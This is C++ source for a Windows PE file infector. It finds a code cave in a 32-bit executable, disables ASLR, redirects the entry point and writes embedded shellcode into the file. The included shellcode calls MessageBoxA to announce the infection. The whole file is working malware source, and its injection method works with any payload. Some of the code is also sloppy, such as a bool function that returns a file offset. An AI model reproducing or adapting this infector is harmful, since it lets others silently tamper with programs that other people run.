#include <windows.h>
#include <stdio.h>
#include <iostream>     

using namespace std;

// Align the given size to the given alignment and returns the aligned address
DWORD align(DWORD size, DWORD align, DWORD address) {
    if (!(size % align))
        return address + size;
    return address + (size / align + 1) * align;
}

bool FindCodeCave(PIMAGE_SECTION_HEADER pish, BYTE* lpFile, DWORD dwFileSize, DWORD dwShellcodeSize, DWORD dwPosition) {
    DWORD dwCount = 0;

    for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
        if (*(lpFile + dwPosition) == 0x00) {
            if (dwCount++ == dwShellcodeSize) {
                // backtrack to the beginning of the code cave
                dwPosition -= dwShellcodeSize;
                break;
            }
        }
        else {
            // reset counter if failed to find large enough cave
            dwCount = 0;
        }
    }
    // if failed to find suitable code cave
    if (dwCount == 0 || dwPosition == 0) {
        fprintf(stderr, "Failed to find suitable code cave\n");
        return 1;
    }
    return dwPosition;
}
bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten, DWORD dwPosition) {
    // Disable ASLR
    pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    pNtHeader->FileHeader.Characteristics = 0x010F;


    // Insert code into last section
    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
    PIMAGE_SECTION_HEADER codeCave = lastSection + 1;

    //DWORD lastEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;
    // move entry point to the start of shell code 
    DWORD codeCaveEntryPoint = dwPosition - pNtHeader->OptionalHeader.ImageBase;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = codeCaveEntryPoint;

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    // Write file from begin to end file
    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
    //set point to code cave (end of the last section)
    SetFilePointer(hFile, lastSection->PointerToRawData + lastSection->SizeOfRawData, NULL, FILE_BEGIN);


    // shellcode
    const char* shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
        "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
        "\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89"
        "\xe3\x68\x74\x65\x64\x58\x68\x6e\x66\x65\x63\x68\x6f\x74"
        "\x20\x69\x68\x76\x65\x20\x67\x68\x59\x6f\x75\x27\x31\xc9"
        "\x88\x4c\x24\x13\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0"
        "\x31\xc0\x50\x68";

    DWORD shellcodeSize = strlen(shellcode1); //270 bytes
    // Write shellcode to the file from code cave
    WriteFile(hFile, shellcode1, shellcodeSize, &byteWritten, NULL);
    if (byteWritten != shellcodeSize) {
        cout << "Error: Fail to write file" << endl;
        return false;
    }
    // Get entry point and use liitle endian and change to hex
    for (int i = 0; i < 4; i++) {
        BYTE carrier = (BYTE)(codeCaveEntryPoint >> (i * 8));
        WriteFile(hFile, &carrier, 1, &byteWritten, NULL);
    }
    // Add \xc3 to the shellcode
    const char* shellcode2 = "\xc3";
    WriteFile(hFile, shellcode2, 1, &byteWritten, NULL);
    if (byteWritten != 1) {
        cout << " Error: Fail to write file " << endl;
        return false;
    }
    CloseHandle(hFile);
    return true;
}

bool OpenFile(const char* fileName) {
    // Open file and get information
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "Error: Invalid file, try another one" << endl;
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (!fileSize) {
        CloseHandle(hFile);
        cerr << "Error: File empty, try another one" << endl;
        return false;
    }
    // Buffer to allocate
    BYTE* pByte = new BYTE[fileSize];
    DWORD byteWritten;

    // Reading the entire file to use the PE information
    if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL)) {
        cerr << "Error: Fail to read file" << endl;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        cerr << "Error: Invalid path or PE format" << endl;
        return false;
    }

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);

    if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        CloseHandle(hFile);
        cerr << "Error: PE32+ detected, this version works only with PE32" << endl;
        return false;
    }

    //last section header
    PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (pNtHeader->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER));
    //find code cave of PE file
    DWORD dwPosition = 0;
    if (!FindCodeCave(pish, pByte, fileSize, 300, dwPosition)) {
        cerr << "Error: Fail to find code cave" << endl;
        return false;
    }
    dwPosition = FindCodeCave(pish, pByte, fileSize, 300, dwPosition);
    // Get entry point
    //DWORD lastEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    // Change entry point to the code cave
    pNtHeader->OptionalHeader.AddressOfEntryPoint = dwPosition;

    // Insert data into the last section
    if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten, dwPosition)) {
        cerr << "Error: Fail to infect Message Box" << endl;
        return false;
    }
    cerr << "Success to infect Message Box into " << fileName << endl;

    CloseHandle(hFile);
    return true;
}


int main(int argc, char* argv[]) {

    if (argc < 2) {
        cout << "Usage: " << argv[0] << " <path\\of\\file>" << endl;
        return 1;
    }

    if (!OpenFile(argv[1])) {
        cerr << "Error: Invalid file path" << endl;
    }

    return 0;
}